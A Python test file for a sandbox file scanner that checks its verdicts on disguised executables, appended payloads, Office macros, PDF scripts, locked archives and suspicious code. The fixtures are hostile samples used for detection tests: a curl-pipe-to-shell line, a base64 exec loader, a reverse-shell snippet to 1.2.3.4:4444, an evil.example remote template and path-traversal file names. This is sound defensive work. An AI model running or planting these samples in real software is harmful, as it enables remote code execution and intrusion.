import io
import struct
import zipfile
import zlib

from sandbox.filescan import analyze, sniff

PE = b'MZ\x90\x00' + b'\x00' * 60 + b'\x0e\x1f\xba\x0e\x00\xb4\t\xcd!\xb8\x01L\xcd!This program cannot be run in DOS mode.\r\r\n$' + b'\x00' * 64


def png(extra=b''):
    def chunk(kind, body):
        return struct.pack('>I', len(body)) + kind + body + struct.pack('>I', zlib.crc32(kind + body))
    ihdr = struct.pack('>IIBBBBB', 1, 1, 8, 2, 0, 0, 0)
    return b'\x89PNG\r\n\x1a\n' + chunk(b'IHDR', ihdr) + chunk(b'IDAT', zlib.compress(b'\x00\xff\x00\x00')) + chunk(b'IEND', b'') + extra


def zipped(members):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
        for name, body in members.items():
            zf.writestr(name, body)
    return buf.getvalue()


def docx(extra=None):
    members = {'[Content_Types].xml': '<Types/>', 'word/document.xml': '<w:document/>', 'word/_rels/document.xml.rels': '<Relationships/>'}
    members.update(extra or {})
    return zipped(members)


def pdf(extra=b''):
    return b'%PDF-1.7\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R ' + extra + b'>>\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF\n'


def codes(report):
    return {f['code'] for f in report['findings']}


def test_clean_image_gets_a_clean_verdict():
    out = analyze(png(), 'holiday.png', 'image/png')
    assert out['verdict'] == 'clean' and out['complete'] and out['kind'] == 'image'
    assert out['findings'] == [] and all(c['ok'] for c in out['checks'])
    assert len(out['sha256']) == 64


def test_program_disguised_as_picture_is_dangerous():
    out = analyze(PE, 'holiday-photo.jpg', 'image/jpeg')
    assert 'disguised_program' in codes(out) and out['verdict'] == 'dangerous'


def test_declared_type_is_used_when_the_name_has_no_extension():
    assert 'disguised_program' in codes(analyze(PE, 'download', 'video/mp4'))


def test_double_extension_and_hidden_direction_characters():
    assert {'double_extension', 'program_file'} <= codes(analyze(PE, 'invoice.pdf.exe'))
    assert 'name_trick' in codes(analyze(PE, 'invoice‮fdp.exe'))


def test_program_appended_to_image():
    out = analyze(png(PE), 'cat.png')
    assert {'hidden_payload', 'embedded_program'} <= codes(out) and out['verdict'] == 'dangerous'


def test_same_family_rename_is_not_flagged():
    assert analyze(png(), 'picture.jpg')['verdict'] == 'clean'


def test_apk_and_installers_are_never_cleared():
    apk = analyze(zipped({'AndroidManifest.xml': 'x', 'classes.dex': 'x'}), 'SBI-Rewards.apk')
    assert apk['type'].startswith('Android app') and apk['verdict'] == 'dangerous'
    assert analyze(PE, 'setup.exe')['verdict'] == 'suspicious'
    assert analyze(b'Set s = CreateObject("WScript.Shell")', 'open-me.vbs')['verdict'] == 'dangerous'


def test_office_macros_and_remote_template():
    assert 'office_macro' in codes(analyze(docx({'word/vbaProject.bin': 'x'}), 'salary.docm'))
    rels = ('<Relationships><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
            'Target="https://evil.example/t.dotm" TargetMode="External"/></Relationships>')
    assert 'office_remote' in codes(analyze(docx({'word/_rels/settings.xml.rels': rels}), 'offer.docx'))
    link = ('<Relationships><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" '
            'Target="https://example.com" TargetMode="External"/></Relationships>')
    clean = analyze(docx({'word/_rels/document.xml.rels': link}), 'letter.docx')
    assert clean['verdict'] == 'clean' and clean['type'] == 'Office document'


def test_pdf_script_including_obfuscated_and_compressed_names():
    assert analyze(pdf(), 'ticket.pdf')['verdict'] == 'clean'
    assert 'pdf_script' in codes(analyze(pdf(b'/OpenAction << /S /JavaScript /JS (app.alert(1)) >> '), 'ticket.pdf'))
    assert 'pdf_script' in codes(analyze(pdf(b'/OpenAction << /S /J#61vaScript >> '), 'ticket.pdf'))
    packed = zlib.compress(b'<< /S /JavaScript /JS (x) >>')
    hidden = pdf() + b'5 0 obj\n<< /Type /ObjStm /N 1 /Filter /FlateDecode >>\nstream\n' + packed + b'\nendstream\nendobj\n'
    assert 'pdf_script' in codes(analyze(hidden, 'ticket.pdf'))
    # Bytes inside an ordinary binary stream are not PDF commands.
    noisy = pdf() + b'6 0 obj\n<< /Length 9 >>\nstream\n/JS /AA /Launch \nendstream\nendobj\n'
    assert analyze(noisy, 'ticket.pdf')['verdict'] == 'clean'


def test_locked_pdf_is_not_cleared():
    out = analyze(pdf(b'/Encrypt 9 0 R '), 'statement.pdf')
    assert not out['complete'] and out['verdict'] == 'unknown'


def test_archive_contents():
    out = analyze(zipped({'photos/beach.jpg': png(), 'photos/viewer.exe': PE}), 'photos.zip')
    assert 'archive_program' in codes(out)
    assert 'archive_disguised' in codes(analyze(zipped({'beach.jpg': PE}), 'photos.zip'))
    assert analyze(zipped({'a.png': png(), 'notes.txt': 'hello'}), 'photos.zip')['verdict'] == 'clean'


def test_dotted_library_names_are_not_double_extensions():
    out = analyze(zipped({'bin/System.Text.Json.dll': PE, 'bin/tool.exe': PE}), 'tools.zip')
    assert 'archive_disguised' not in codes(out) and 'archive_program' in codes(out)
    assert 'double_extension' in codes(analyze(PE, 'photo.jpg      .exe'))


def test_password_locked_archive_is_not_cleared():
    raw = bytearray(zipped({'a.txt': 'hello'}))
    raw[6] |= 1                                   # local header flag
    raw[raw.index(b'PK\x01\x02') + 8] |= 1        # central directory flag
    out = analyze(bytes(raw), 'docs.zip')
    assert 'archive_locked' in codes(out) and not out['complete']


def test_svg_html_rtf_and_eicar():
    assert 'svg_active' in codes(analyze(b'<svg xmlns="http://www.w3.org/2000/svg"><script>location="//x"</script></svg>', 'logo.svg'))
    assert analyze(b'<svg xmlns="http://www.w3.org/2000/svg"><rect width="1" height="1"/></svg>', 'logo.svg')['verdict'] == 'clean'
    page = analyze(b'<html><body><form><input type="password"></form><script>eval(atob("x"))</script></body></html>', 'invoice.html')
    assert {'html_file', 'html_password', 'html_scrambled'} <= codes(page) and page['verdict'] == 'dangerous'
    assert 'rtf_object' in codes(analyze(b'{\\rtf1{\\object\\objemb\\objupdate{\\*\\objdata 0105}}}', 'cv.rtf'))
    assert analyze(b'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*', 'eicar.com')['verdict'] == 'dangerous'


def test_video_checks():
    mp4 = b'\x00\x00\x00\x18ftypisom\x00\x00\x02\x00isomiso2' + b'\x00' * 64
    assert analyze(mp4, 'clip.mp4', 'video/mp4')['verdict'] == 'clean'
    assert 'embedded_program' in codes(analyze(mp4 + PE, 'clip.mp4'))
    assert sniff(mp4) == 'mp4'


def test_truncated_unknown_and_hostile_input_never_clear_or_crash():
    big = analyze(png(), 'huge.png', truncated=True, total_size=10**9)
    assert not big['complete'] and big['sha256'] is None and big['size'] == 10**9
    assert analyze(b'\x00\x01\x02\x03' * 50, 'thing.dat')['verdict'] == 'unknown'
    assert analyze(b'', 'empty.jpg')['verdict'] == 'unknown'
    assert not analyze(b'PK\x03\x04garbage', 'broken.zip')['complete']
    assert analyze(b'\x89PNG\r\n\x1a\n\xff\xff\xff\xff', '../../etc/passwd\x00.png')['name'] == 'passwd.png'


def test_code_is_judged_by_what_it_does():
    mail = b'#!/usr/bin/env python3\nimport smtplib\nwith smtplib.SMTP_SSL("smtp.gmail.com", 465) as s:\n    s.login(USER, PASSWORD)\n'
    api_call = b"import requests, subprocess\nprint(requests.get('https://api.github.com').json())\nsubprocess.run(['git', 'status'])\n"
    for data, name in ((mail, 'send_mail.py'), (mail, 'send_mail'), (api_call, 'api.py'), (b'#!/bin/bash\npip install -r requirements.txt\n', 'setup.sh')):
        result = analyze(data, name)
        assert result['verdict'] == 'clean' and 'source code' in result['type'], (name, result['findings'])
    assert 'code_download_run' in codes(analyze(b'#!/bin/sh\ncurl -s https://x.example/i.sh | sh\n', 'install.sh'))
    assert 'code_hidden' in codes(analyze(b"import base64\nexec(base64.b64decode('aW1wb3J0IG9z'))\n", 'loader.py'))
    assert analyze(b"import socket,os\ns=socket.socket();s.connect(('1.2.3.4',4444))\nos.dup2(s.fileno(),0)\n", 'r.py')['verdict'] == 'dangerous'
    assert analyze(b'#!/bin/sh\necho hi\n', 'photo.jpg')['verdict'] != 'clean'
    assert analyze(b'@echo off\necho hello\n', 'run.bat')['verdict'] == 'suspicious'
